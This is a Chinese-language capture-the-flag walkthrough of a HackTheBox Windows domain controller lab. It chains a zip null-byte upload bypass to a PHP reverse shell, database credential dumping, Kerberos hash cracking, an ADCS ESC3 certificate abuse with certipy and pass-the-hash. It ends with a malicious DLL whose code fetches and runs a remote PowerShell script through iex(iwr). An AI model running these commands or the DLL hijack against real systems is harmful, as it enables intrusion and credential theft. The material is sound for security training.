拿到这台windows机器，先nmap快速扫描一下：

```
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman
```

ldap,smb,dns等服务都开着，大概率是一台DC。我们对389端口添加-sV参数详细扫描：

```
PORT    STATE SERVICE VERSION
389/tcp open  ldap    Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

可以看到确实是AD域环境，域名是certificate.htb。

同时题目没有给出初始账户密码，而且nmap扫描出来开放了80端口，应该是从web漏洞拿一个shell了：

![image-20251010113143431](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20251010113143431.png)

这里有一个注册栏，我们先注册登录一下。注意这里提示注册为教师需要确认身份，实际就是登陆不上，我们注册为学生即可。

登录进去后看一看发现这是一个在线课程网站，类似mooc。我们选择一门课程加入后，可以观看它的课程视频，并且在quizz处上传文件。这里就存在文件上传漏洞：

![image-20251010150848724](C:\Users\zdx33\AppData\Roaming\Typora\typora-user-images\image-20251010150848724.png)

提示只能上传.pdf .docx .pptx .xlsx等类型文件。针对格式绕过姿势比较多，这里可以whatweb抓一下指纹：

```
──(root㉿kali)-[/home/orange/HTB]
└─# whatweb 10.10.11.71
http://10.10.11.71 [301 Moved Permanently] Apache[2.4.58], Country[RESERVED][ZZ], HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30], IP[10.10.11.71], OpenSSL[3.1.3], PHP[8.0.30], RedirectLocation[http://certificate.htb/], Title[301 Moved Permanently]
http://certificate.htb/ [200 OK] Apache[2.4.58], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30], HttpOnly[PHPSESSID], IP[10.10.11.71], JQuery[2.2.4], Meta-Author[colorlib], OpenSSL[3.1.3], PHP[8.0.30], Script[text/javascript], Title[Certificate | Your portal for certification], X-Powered-By[PHP/8.0.30]
```

php版本很新，基本就不存在%00截断之类漏洞。其他绕过主要有针对前端校验，校验MIME类型，文件头逃过之类。但是这里的过滤很严格，本身又是白名单。

注意到是可以上传一个zip压缩包的。在我们上传了一个包含pdf文件的压缩包后，它给出了一个指向pdf文件的链接。这说明它后台是解压缩了这个压缩包，我们可以在压缩包中夹带一个webshell，它在解压缩后未进行校验的话就可以拿到shell

webshell我们使用kali自带的`/usr/share/webshells/php/php-reverse-shell.php`

复制一份修改一下ip和端口，zip压缩后上传：

然后页面显示压缩包中包含有非法后缀名的文件。难道这样就无法利用了吗？

其实不然。php<5.3.4时候，有一个比较知名的%00截断。是php语言的漏洞，它在读取文件名的时候读到空字节就认为读完了，比如1.php%00.jpg，php会保存为1.php。这里php版本是8，无法利用这个漏洞，但是它的zip在解压的时候也会触发零字节截断。零字节截断的原理都是相同的，就是%00最终被解析cha(0),而在ASCII码0对应的为空字符，当**在字符串中有空字符时会导致后面的字符被丢弃**。

zip在解压的时候读取压缩包中的元数据中的文件名，读到零字节的时候也会认为文件名结束，导致文件名被截断。

我们将webshell改名为file.php..pdf，用python的zipfile模块压缩。然后通过二进制编辑器比如imhex修改zip的元数据中的文件名，将第一个点修改为零字节即可。这样文件名就变成了file.php\0.pdf。解压缩出来的文件就变成了file.php。这里也可以直接在burpsuite中修改二进制，或者使用一些linux命令行中的二进制工具比如od,hexdump,xxd。实测xxd最为简单好用，自带颜色和字节对应的ascii码,可以如下操作：

```
# 生成十六进制转储
xxd test.zip > test.hex

# 修改（将第二个点2e改为00）
# 原始：66 69 6c 65 2e 70 68 70 2e 2e 70 64 66
# 修改：66 69 6c 65 2e 70 68 70 00 2e 70 64 66

# 使用sed精确替换
sed -i 's/70 2e 2e 70/70 00 2e 70/' test.hex

# 转换回二进制
xxd -r test.hex > test_modified.zip
```

当然有GUI的imhex和010Editor更加简单。

修改完成之后可以本地解压确认一下：

```
└─# unzip -l orange.zip                   #-l进行预览不真正解压
Archive:  orange.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     5493  2025-10-12 15:11   my_reverse.php
---------                     -------
     5493                     1 file
```

上传文件，点击here发现找不到url，因为它默认访问的是file.php..pdf，我们手动访问file.php，即可成功连接。

注意这里使用的writeup给的`reverse_shell.php`。这个php脚本更加现代，用kali自带的webshells中的反弹shell的php脚本无法成功反弹。

拿到shell后发现是cmd环境，我们`di`r +  `cd ..`找一找敏感文件，发现一个db.php，大概率有连数据库的账户密码：

```
C:\xampp\htdocs\certificate.htb>type db.php
<?php
// Database connection using PDO
try {
    $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
    $db_user = 'certificate_webapp_user'; // Change to your DB username
    $db_passwd = 'cert!f!c@teDBPWD'; // Change to your DB password
    $options = [
        PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
        PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
    ];
    $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
} catch (PDOException $e) {
    die('Database connection failed: ' . $e->getMessage());
}
?>
```

切换到更强大的powershell，然后用mysql.exe连接mysql：

```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -D
'Certificate_WEBAPP_DB' -e 'show tables;'
```

然后查看其中的users表：

```
PS C:\xampp\mysql\bin> .\mysql.exe -u certificate_webapp_user -p'cert!f!c@teDBPWD' -D 'Certificate_WEBAPP_DB' -e 'select * from users;'
id	first_name	last_name	username	email	password	created_at	role  is_active
1	Lorra	Armessa	Lorra.AAA	lorra.aaa@certificate.htb	$2y$04$bZs2FUjVRiFswY84CUR8ve02ymuiy0QD23XOKFuT6IM2sBbgQvEFG	2024-12-23 12:43:10	teacher	1
6	Sara	Laracrof	Sara1200	sara1200@gmail.com	$2y$04$pgTOAkSnYMQoILmL6MRXLOOfFlZUPR4lAD2kvWZj.i/dyvXNSqCkK	2024-12-23 12:47:11	teacher	1
7	John	Wood	Johney	johny009@mail.com	$2y$04$VaUEcSd6p5NnpgwnHyh8zey13zo/hL7jfQd9U.PGyEW3yqBf.IxRq	2024-12-23 13:18:18	student	1
8	Havok	Watterson	havokww	havokww@hotmail.com	$2y$04$XSXoFSfcMoS5Zp8ojTeUSOj6ENEun6oWM93mvRQgvaBufba5I5nti	2024-12-24 09:08:04	teacher	1
9	Steven	Roman	stev	steven@yahoo.com	$2y$04$6FHP.7xTHRGYRI9kRIo7deUHz0LX.vx2ixwv0cOW6TDtRGgOhRFX2	2024-12-24 12:05:05	student	1
10	Sara	Brawn	sara.b	sara.b@certificate.htb	$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFo6uUs3nB.pzQPV.g8UdXikZNdH6	2024-12-25 21:31:26	admin	1
12	Hello	user	hellouser	hellouser@mail.com	$2y$04$NE5fcVrrsvAPiqwlsUcKO.91I2EtyXbnqDG17uOsPYYjMoqQ82BiO	2025-10-12 02:49:51	student	1
13	orange	orange	orange	orange@qq.com	$2y$04$eD.6/ArNhblC/9Qc9NcNOu004QeGirAwCAMVmS1wAFfJurtUEHjGC	2025-10-12 07:58:41	student	1
14	zdx	zdx	zdx	zdx@qq.com	$2y$04$oMCjolh.ivW8qu5j84xGl.6SIjSxl9jQ1h3hURUZ0fSg2qBBzZQOO	2025-10-12 08:32:45	student	1
```

其中lorra和sara的email是`@certificate.htb`，可能产生密码复用。我们先用john或者hashcat跑一下密码,

其中sara的密码很快跑出来了，是`Blink182`

我们先用smb服务测试一下：

```
nxc smb 10.10.11.71 -u sara.b -p 'Blink182' --smb-timeout 10 --timeout 10 -t 1 --verbose  --shares
...
SMB         10.10.11.71     445    DC01             [+] certificate.htb\sara.b:Blink182 
```

用户密码正确！我们成功拿到一个域中的账户sara.b/Blink182。--shares看了下只有默认共享。

可以--users 跑一下用户看看（也可以在powershell中`Get-ADUser`查看）：

```
SMB         10.10.11.71     445    DC01             Administrator                 2025-04-28 21:33:46 0       Built-in account for administering the computer/domain
SMB         10.10.11.71     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.10.11.71     445    DC01             krbtgt                        2024-11-03 09:24:32 0       Key Distribution Center Service Account
SMB         10.10.11.71     445    DC01             Kai.X                         2024-11-04 00:18:06 0
SMB         10.10.11.71     445    DC01             Sara.B                        2024-11-04 02:01:09 0
SMB         10.10.11.71     445    DC01             John.C                        2024-11-04 02:16:41 0
SMB         10.10.11.71     445    DC01             Aya.W                         2024-11-04 02:17:43 0
SMB         10.10.11.71     445    DC01             Nya.S                         2024-11-04 02:18:53 0
SMB         10.10.11.71     445    DC01             Maya.K                        2024-11-04 02:20:01 0
SMB         10.10.11.71     445    DC01             Lion.SK                       2024-11-04 02:28:02 0
SMB         10.10.11.71     445    DC01             Eva.F                         2024-11-04 02:33:36 0
SMB         10.10.11.71     445    DC01             Ryan.K                        2024-11-04 02:57:30 0
SMB         10.10.11.71     445    DC01             akeder.kh                     2024-11-24 02:26:06 0
SMB         10.10.11.71     445    DC01             kara.m                        2024-11-24 02:28:19 0
SMB         10.10.11.71     445    DC01             Alex.D                        2024-11-24 06:47:44 0
SMB         10.10.11.71     445    DC01             karol.s                       2024-11-24 02:42:21 0
SMB         10.10.11.71     445    DC01             saad.m                        2024-11-24 02:44:23 0
SMB         10.10.11.71     445    DC01             xamppuser                     2024-12-29 09:42:04 0
SMB         10.10.11.71     445    DC01             [*] Enumerated 18 local users: CERTIFICATE
```

看到有名为Sara.B的用户，和sara.b很相似，很有可以产生密码复用，我们可以直接尝试，当然也可以把所有用户保存，用`Blink182`进行密码喷洒：

最后果然Sara.B尝试成功，密码也是Blink182。

这里我们就有了两个用户，优先尝试能不能winrm远程登录，发现Sara.B可以直接远程登录！

这里同时可以用bloodhound分析一下，先收集数据：

```
bloodhound-python -d certificate.htb -dc 'dc01.certificate.htb' -u sara.b -p 'Blink182' -ns 10.10.11.71
```

然后到图形化页面上传收集的json文件，并分析：

```
└─# bloodhound-cli up
```

发现sara.b没有outbound  object  contrl。 原来是有对lion.sk的genericall权限，但是在`10TH JUNE, 2025`机器进行了一次修复，这个权限也就消失了。

evil-winrm连接进去看看

```
*Evil-WinRM* PS C:\Users\Sara.B\Downloads> whoami /all

/all	显示当前访问令牌中的所有信息，包括当前用户名、安全标识符（SID）、特权和当前用户所属的组。

USER INFORMATION
----------------

User Name          SID
================== =============================================
certificate\sara.b S-1-5-21-515537669-4223687196-3249690583-1109


GROUP INFORMATION
-----------------

Group Name                                 Type             SID                                           Attributes
========================================== ================ ============================================= ==================================================
Everyone                                   Well-known group S-1-1-0                                       Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Certificate Service DCOM Access    Alias            S-1-5-32-574                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Desktop Users               Alias            S-1-5-32-555                                  Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580                                  Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2                                       Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11                                      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15                                      Mandatory group, Enabled by default, Enabled group
CERTIFICATE\Help Desk                      Group            S-1-5-21-515537669-4223687196-3249690583-1110 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10                                   Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level     Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

提示kerberos服务被禁用，就可以暂时排除kerberos相关攻击。

三个权限后两个权限都是正常权限，第一个权限是可以添加一个新的账户，暂时没有利用思路。

我们还是先翻翻找找。发现C:\Users\Sara.B\下目录基本都为空，除了默认的C:\Users\Sara.B\Documents\，其中有一个WS-01文件夹，其中有一个txt和一个pcap文件，我们下载一下。

这里和之前下载windows凭据和主密钥文件不同，这两个文件都不是什么敏感文件，我们无需C2工具如sliver

其中的txt文件内容如下：

```
ÿþThe workstation 01 is not able to open the "Reports" smb shared folder which is hosted on DC01.
When a user tries to input bad credentials, it returns bad credentials error.
But when a user provides valid credentials the file explorer freezes and then crashes!
```

也就是说reports共享无法打开，凭据正确返回错误提示，凭据错误直接冻结然后崩溃。

这描述了一个DC01主机上的问题，接着wireshark分析一下pcap文件：

我们用协议分级功能查看一共有哪些协议：

![image-20251012174143116](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20251012174143116.png)

可以看到大部分数据包协议是TCP和SMB。查看一下访问smb服务时的NTLM验证包，发现是Administrator登录到WS-01时候的数据包，和目录名称相同。大量失败的数据包也证实了上面txt中描述的情况。

这里提一下可以从数据包中找出NTLMv2哈希，提取出的hash可以直接破解或者使用pass-the-hash直接登录。这里贴一篇提取步骤的文章：https://zhuanlan.zhihu.com/p/52882041。NTLMv2 哈希的格式是`username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response`。我们找出这些值拼凑起来即可。但是这里的Administrator指的是ws-01的管理员，不是域账户。我们也访问不了ws-01，所以没有价值。

发现有少量kerberos包，我们过滤出kerberos协议查看一下：

![image-20251012174439209](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20251012174439209.png)

在第二个成功的AS-REQ包中我们可以找到用户名`CnameString: Lion.SK`，然后下面有一个列表列出支持的etype，也就是支持的加密类型。在AS-REP中服务器指定了加密类型：

```
etype: eTYPE-AES256-CTS-HMAC-SHA1-96 (18)
```

然后还有realm，这是Kerberos 系统中的一个命名空间，用于区分不同kerberos环境，这里是`certificate.htb`

我们的目的是获取用户Lion.SK的密码，在一次kerberos认证中，有三个哈希：

1. Kerberos 5 Pre-Authentication 哈希    格式：`$krb5pa$<etype>$<user>$<realm>$<cipher>`
2. AS-REP 哈希          格式：`$krb5asrep$<etype>$<user>$<realm>$<cipher>`
3. TGS-REP 哈希         格式：`$krb5tgs$<etype>$<user>$<realm>$<servicename>$<cipher>`

第一个是在AS-REQ中用户发送用密码哈希加密的时间戳证明自己身份

第二个是AS-REP中AS会发送两部分，第一部分由用户密码哈希加密，包含了  TGS session key 等，第二部分就是TGT，由krbtgt的密码加密，用户无法解密。

第三个是TGS返回的TGS-REP中部分B的ST使用服务账户密码哈希加密，跑出来可以拿一个白银票据。

预认证可以关闭，但是关闭后就无法校验发起请求的用户身份。

我们使用第一个，在第二个成功的AS-REQ包中的padata中可以找到pA-ENC-TIMESTAMP下的cipher:

``````
23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
``````

组合一下就成了预认证哈希：

```
$krb5pa$18$Lion.SK$certificate.htb$23f5159fa1c66ed7b0e561543eba6c010cd31f7e4a4377c2925cf306b98ed1e4f3951a50bc083c9bc0f16f0f586181c9d4ceda3fb5e852f0
```

然后hashcat跑一下：

```
hashcat -m 19900 -a 0 hash /usr/share/wordlists/rockyou.txt
```

得到密码是：`!QAZ2wsx`

于是拿到一个新账户`Lion.SK/!QAZ2wsx`

bloodhound搜一下，发现在remote management users组，那就远程登录一下:

在该用户的桌面文件夹找到user flag:

```
e67868307b2ffeac9cb81ee3a753ced7
```

通过bloodhound或者`whoami /all`分析得出整个用户属于一个新的组：`Domain CRA Managers`

通过`get-adgroup`命令看看这个组的信息：

```
get-adgroup "Domain CRA Managers" -properties *        #  -properties * 查看完整信息

...
Description : The members of this security group are responsible for issuing and revoking multiple certificates for the domain users
...
```

显示这个组的成员有证书管理权力。

这里涉及到Active Directory证书服务(ADCS)攻击

首先要从PKINIT Kerberos认证讲起。https://www.freebuf.com/articles/network/368120.html  正如上文所说，正常的kerberos认证在预认证时，是AS-REQ包含用户密码哈希加密的时间戳。AS在返回的AS-REP中的第一部分也是由用户密码哈希加密。这样过于依赖用户密码哈希，容易受到密码喷射，哈希传递等攻击。因此引入PKINIT作为扩展，允许使用**公钥密码学**。KDC会存储用户的个人证书，用户在预认证的时候使用证书私钥签名时间戳，KDC使用证书的公钥检验。AS-REP的第一部分使用证书公钥加密，这样用户可以使用私钥解密。

上面贴出的文章还提到：

> 注意到在微软的官方文档中有这样一句话：为了支持连接到不支持Kerberos身份验证的网络服务的应用程序NTLM的身份验证，当使用PKCA时，KDC将在PAC特权属性证书的PAC_CREDENTIAL_INFO缓冲区中返回用户的NTLM Hash。
>
> 也就是说当使用证书进行Kerberos认证时，返回的票据的PAC中是包含用户的NTLM Hash的。

注意PAC本身是包装在TGT中的**“用户身份和权限清单”**

> 后续无论administrator用户密码怎么更改，使用administrator.pfx证书获取的administrator用户的NTLM Hash都是最新的，因此，可以利用这一点进行权限维持。

然后就是证书模板，在为一个服务器申请证书的时候就能看到模板，就是一些为了选定的任务预先配置的证书，比如用户模板，计算机模板等等。

> 在[Certified_Pre-Owned.pdf](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)中提到了具有以下扩展权限的证书可以用于Kerberos认证：
>
> - 客户端身份验证，对应的OID为1.3.6.1.5.5.7.3.2
> - PKINIT客户端身份验证，对应的OID为1.3.6.1.5.2.3.4
> - 智能卡登录，对应的OID为1.3.6.1.4.1.311.20.2.2
> - 任何目的，对应的OID为2.5.29.37.0
> - 子CA

ADCS的利用就围绕着**证书模板错误的权限设置**

比如一个模板证书配置了客户端身份认证的扩展权限，那么它就可以用于kerberos验证。而这个模板证书允许低权限用户注册，不需要管理员审批，而它又设置了从申请证书的请求中读取**使用者名称**。结合起来，攻击者通过一个用户申请这个模板的证书，在请求中指定**域管理员**为证书的使用者。拿到证书后，通过**PKINIT**进行使用证书的kerberos认证，拿到了域管理员的**TGT**。这就是一张**黄金票据**。

SpecterOps团队在其白皮书中系统化定义了ESC1~8八种攻击手法，后续又陆续补充了几种。白皮书链接：https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf  

还有一些比较新的漏洞比如CVE-2022-26923通过改自己机器的dNSHostName获取域控机器账户的证书，这是利用特定模板的漏洞。

这本白皮书基本奠定了ADCS的利用的理论基础。之后就出现了各种利用工具，其中比较有名的就是certipy。

certify的作用简单来说就是先找到当前用户可注册的，存在已知漏洞的模板，然后申请这个模板的证书。

我们使用certify的find列举Lion.SK能注册的证书模板：

```
certipy-ad find -dc-ip 10.10.11.71 -u Lion.SK -p '!QAZ2wsx' -stdout 
...
0
    Template Name                       : Delegated-CRA
...
 [!] Vulnerabilities
      ESC3                              : Template has Certificate Request Agent EKU set.
...
1
    Template Name                       : SignedUser
...
[*] Remarks
      ESC3 Target Template              : Template can be targeted as part of ESC3 exploitation. This is not a vulnerability by itself. See the wiki for more details. Template requires a signature with the Certificate Request Agent application policy.
```

首先名为Delegated-CRA的模板有**证书请求代理**扩展权限，可以和名为SingedUser的模板配合进行ESC3攻击：

1. **获取代理证书**：首先获得"Delegated-CRA"模板的证书请求代理证书
2. **伪造高权限身份**：使用该代理证书为"SignedUser"模板请求证书，并在请求中指定高权限用户（如域管理员）的身份

先申请一个有证书请求代理扩展权限的证书：

```
└─# certipy-ad req -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'Delegated-CRA' -u Lion.SK -p '!QAZ2wsx'
```

然后用它代理为SingedUser模板申请一张管理员身份的证书：

```
└─# certipy-ad -debug req -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'SignedUser' -u lion.sk@certitifcate.htb -p '!QAZ2wsx' -on-behalf-of 'CERTIFICATE\Administrator' -pfx lion.sk.pfx
```

注意两条指令的-u参数不一样，一种是传统的账户形式，一种是xxx@xxx.xx的UPN形式。经测试两条指令-u Lion.SK均可以成功，但是第一条指令-u lion.sk@certitifcate.htb失败

这里的第二条指令执行还是会出错，提示需要邮箱。这个模板注册需要用户的邮箱，而Administrator账户没有预先设定邮箱，因此我们无法申请管理员的证书。

为了查看有哪些用户是有邮箱的，我们可以使用impacket包中的GetADUsers.py进行枚举：

```
└─# ./GetADUsers.py certificate.htb/Lion.SK:'!QAZ2wsx' -all -dc-ip 10.10.11.71
```

```
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Administrator                                         2025-04-29 05:33:46.958071  2025-10-13 15:23:09.884388 
Guest                                                 <never>              <never>             
krbtgt                                                2024-11-03 17:24:32.914665  <never>             
Kai.X                 kai.x@certificate.htb           2024-11-04 08:18:06.346088  2024-11-24 14:36:30.608468 
Sara.B                sara.b@certificate.htb          2024-11-04 10:01:09.188915  2024-12-27 14:01:28.460147 
John.C                john.c@certificate.htb          2024-11-04 10:16:41.190022  <never>             
Aya.W                 aya.w@certificate.htb           2024-11-04 10:17:43.642034  <never>             
Nya.S                 nya.s@certificate.htb           2024-11-04 10:18:53.829718  <never>             
Maya.K                maya.k@certificate.htb          2024-11-04 10:20:01.657941  <never>             
Lion.SK               lion.sk@certificate.htb         2024-11-04 10:28:02.471452  2024-11-04 16:24:08.500719 
Eva.F                 eva.f@certificate.htb           2024-11-04 10:33:36.752043  <never>             
Ryan.K                ryan.k@certificate.htb          2024-11-04 10:57:30.939423  2024-11-27 10:48:21.040389 
akeder.kh                                             2024-11-24 10:26:06.813668  2024-11-24 10:51:49.735026 
kara.m                                                2024-11-24 10:28:19.142081  <never>             
Alex.D                alex.d@certificate.htb          2024-11-24 14:47:44.514001  2024-11-24 14:48:05.703180 
karol.s                                               2024-11-24 10:42:21.125611  <never>             
saad.m                saad.m@certificate.htb          2024-11-24 10:44:23.532500  <never>             
xamppuser                                             2024-12-29 17:42:04.121622  2025-10-13 14:57:06.931198 
```

这些有邮箱的用户就是我们能够为其申请证书的用户，证书可以用于PIKNIT kerberos认证。也就是说，我们可以伪装成这些有邮箱的用户。为了确定伪装成谁，我们可以打开bloodhound看看它们都属于哪些组，有什么权限。

找到了Ryan.K属于Domain Storage  Managers组，可以管理磁盘存储

我们直接申请它的证书：

```
└─# certipy-ad req -u Lion.SK -p '!QAZ2wsx' -dc-ip 10.10.11.71 -ca 'Certificate-LTD-CA' -template 'SignedUser' -on-behalf-of 'CERTIFICATE\Ryan.k' -pfx lion.sk.pfx
```

然后使用certipy进行认证：

```
└─# certipy-ad -debug auth -pfx ryan.k.pfx -dc-ip 10.10.11.71 
Certipy v5.0.3 - by Oliver Lyak (ly4k)
...
[*] Got hash for 'ryan.k@certificate.htb': aad3b435b51404eeaad3b435b51404ee:b1bc3d70e70f4f36b1509a65ae1a2ae6
```

注意这里第一次使用会出现`KRB_AP_ERR_SKEW(Clock skew too great)`错误，这是因为机器和域控制器之间的系统时钟不同步。Kerberos 认证协议要求所有参与计算机的时间必须同步，通常**时间差不能超过5分钟**。先使用systemctl**停止`systemd-timesyncd`服务**，然后再使用`ntpdate 10.10.11.71`同步系统时钟。`sudo apt install ntpsec-ntpdate `安装ntpdate

```
└─# ntpdate 10.10.11.71                               
2025-10-15 21:16:07.451149 (+0800) +0.001513 +/- 0.138697 10.10.11.71 s1 no-leap
```

可以看到这里就同步成功了。如果不先停止systemd-timesyncd，则一直同步不成功，有八小时时差。

然后再次运行certipy auth即可。

这里成功获取到了密码哈希。前半段是LM哈希，固定为空值，后半段才是真正的NT(LM)哈希。但是这个哈希如何在PKINIT协议认证的过程中获得？问了AI很多遍，都没能解释清楚。KDC将在PAC特权属性证书的PAC_CREDENTIAL_INFO缓冲区中返回用户的NTLM Hash，这是为了兼容不支持kerberos的服务而设置。但是PAC是封存在加密的票据用于授权。

我们使用wireshark抓包看一下，先ping确认可以抓到包，然后重新认证：

![image-20251015133009929](https://raw.githubusercontent.com/ssaa769/typora-images/main/typora/image-20251015133009929.png)

首先过滤出kerberos数据包，然后我们可以在AS-REQ中的pdata找到pA-PAC-REQUEST的中有`include-pac: True`，这是明确告诉KDC在后续的票据中包含PAC。我们需要通过PAC获取到NTLM哈希。但是这里除了TCP以外就只有四个kerberos包，所以certipy肯定是本地进行了一些计算。目前有两种猜测：

1. 直接暴力破解票据拿PAC
2. deepseek所说， Kerberos session key 与用户长期密钥有数学关系，可以从kerberos session key推导。
3. deeseek所说，用过U2U协议扩展

为了搞明白究竟是如何拿到的哈希，我们看看certipy的源码：https://github.com/ly4k/Certipy/blob/main/certipy/commands/auth.py

第723行开始是提取NT hash的代码，可以明确看到，这里的备注写明：

```
# Create AP-REQ for User-to-User (U2U) authentication
```

也就是说，是通过U2U协议拿到了NTLM哈希。U2U协议是这样的，在你拿到 一个TGT之后和对应的session key之后，允许发送一个带着TGT的U2U协议扩展的TGS，请求使用TGT中的session key加密服务票据ST，而不是使用对应服务的长期密钥。代码流程大致如下：

```
# Create AP-REQ for User-to-User (U2U) authentication
# Use received ticket
# Create authenticator for AP-REQ
# Set time in authenticator
# Encrypt authenticator with session key
# Create TGS-REQ with U2U flag
# Add AP-REQ as PA data
# Set KDC options for U2U
# Request a ticket to self (U2U)
# Include our own ticket
...
# Send TGS-REQ
# Decrypt ticket from TGS-REP
plaintext = new_cipher.decrypt(session_key, 2, ciphertext)
# Extract PAC from ticket
# Look for credential info in PAC
```

这个扩展协议的应用场景主要是用户A需要访问以用户B身份运行的服务，而不是系统运行的。这时候需要用户到用户的认证。标准kerberos中，A会请求一个用于B的服务票据，但是这是不允许的，客户端不能随便获取其他用户的服务票据。U2U的出现就是为了解决这个问题，A发送一个TGS_REQ，包含自己的TGT（证明身份），和B的TGT，TGS收到请求并验证后生成一个新的服务票据，信息是 客户端：A  & 服务端：B，同时用B的TGT会话密钥加密，而不是用B的长期密码密钥。这样B的服务验证票据的时候就不需要知道B的长期密码密钥了。

我们先通过正常kerberos拿到自己的TGT和会话密钥，就可以请求一张到自己的U2U服务票据了。

用evil-winrm 的-H选项使用哈希登录：

```
evil-winrm -i 10.10.11.71 -u ryan.k -H b1bc3d70e70f4f36b1509a65ae1a2ae6
```

然后`whoami /all`查看所有权限：

```
Privilege Name                Description                      State
============================= ================================ =======
SeMachineAccountPrivilege     Add workstations to domain       Enabled
SeChangeNotifyPrivilege       Bypass traverse checking         Enabled
SeManageVolumePrivilege       Perform volume maintenance tasks Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set   Enabled
```

发现有SeManageVolumePrivilege（在Domain Storage  Managers组中）。

> **SeManageVolumePrivilege** 的中文名称是“**执行卷维护任务**”。拥有此特权的用户或进程可以对整个卷（例如 C: 盘、D: 盘）进行维护操作。
>
> 它的核心作用是：**在文件系统驱动层面执行操作，而不是在文件对象层面**。这意味着它不检查单个文件或文件夹的访问控制列表，因为它操作的是存储这些文件的“容器”本身。

也就是说可以读取、修改、移动或删除磁盘上的**任何文件**。这个权限一般只有管理员才有。

github上找利用程序：https://github.com/CsEnox/SeManageVolumeExploit

下载它的releases中编译好的exe文件，通过evil-winrm上传后执行，我们就可以获得对C盘的完全控制。

根据这里的描述，下一步利用是覆盖目录C:\Windows\System32\spool\drivers\x64\3下的Printconfig.dll，但是我们这里靶机中没有这个目录，只能换dll劫持。

这里获得了对C盘的控制之后核心思想就是劫持dll，用我们的包含恶意代码的dll覆盖正常的dll，然后执行一些指令触发，执行恶意代码。反弹shell后的权限取决于加载dll运行时的权限。Windows服务运行时使用三种主要内置账户：

- **Local System** (`NT AUTHORITY\SYSTEM`) - 最高权限
- **Local Service** (`NT AUTHORITY\LOCAL SERVICE`) - 较低权限
- **Network Service** (`NT AUTHORITY\NETWORK SERVICE`) - 中等权限

我们按照writeup中覆盖tzres.dll,执行systeminfo触发恶意代码，去执行我们机器中的shell.ps1，通过powershell反弹一个shell环境。此时执行whoami就会发现用户是`NT AUTHORITY\NETWORK SERVICE`。而在大多数现代Windows系统中，`NETWORK SERVICE` 账户**默认具有 `SeImpersonatePrivilege`** 权限。这个模仿权限之前提过，可以执行“土豆攻击”。

```
C:\Windows\System32\wbem\tzres.dll   是Time Zone Resource DLL（时区资源动态链接库），主要包含：
    时区名称和描述的本地化字符串
    时区规则和转换信息
    ** daylight saving time（夏令时）相关数据**
    多语言支持的资源数据
C:\Windows\System32\wbem  这个wbem目录主要提供WMI服务，也就是Windows Management Instrumentation，用于管理和监控windows系统。这个服务在涉及到时区相关操作时就会调用tzres.dll。
之前的Printconfig.dll是打印后台处理服务，一般以system权限运行，这也是为什么优先覆盖这个的原因。
writeup中的恶意tzres.dll是：

#include <windows.h>
#include <stdlib.h>
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved
)
{
switch (ul_reason_for_call)
 {
case DLL_PROCESS_ATTACH:
system("powershell -c iex(iwr -uri http://10.10.14.67/shell.ps1 -
UsebasicParsing)");
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
 }
return TRUE;
}

这里用的是powershell -c iex(iwr -uri http://10.10.14.67/shell.ps1 -
